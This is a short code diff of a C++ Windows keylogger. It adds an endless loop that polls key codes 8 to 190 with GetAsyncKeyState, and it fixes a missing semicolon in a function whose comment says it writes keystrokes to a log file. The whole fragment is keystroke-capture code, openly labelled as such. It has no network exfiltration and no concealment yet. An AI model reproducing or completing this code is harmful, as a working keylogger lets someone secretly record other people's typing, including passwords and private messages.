@@ -11,7 +11,7 @@ void fileData(std::string data) {
     //put keystrokes into text file
     log_file << data;
     //Close the file
-    log_file.close()
+    log_file.close();
 }
 
 std::string specialKey(int keyPressed) {
@@ -27,8 +27,18 @@ std::string specialKey(int keyPressed) {
 }
 
 int main() {
-    //Loop through each key using ASCII values.
-    //Check if the key is pressed
-    //If its a special key, translate it
+    //loop forever
+    while(true){
+         //Loop through each key using Virtual-Key Codes.
+        //Start at 8 and go to 190 since the rest of the key codes can vary
+        for(int keyCode=8; keyCode<=190; keyCode++) {
+            //Check if the key is pressed
+            if(GetAsyncKeyState(keyCode)) {
+                std::cout << keyCode << std::endl;
+            }
+            //If its a special key, translate it
+        }
+    }
+    
     return 1;
 }
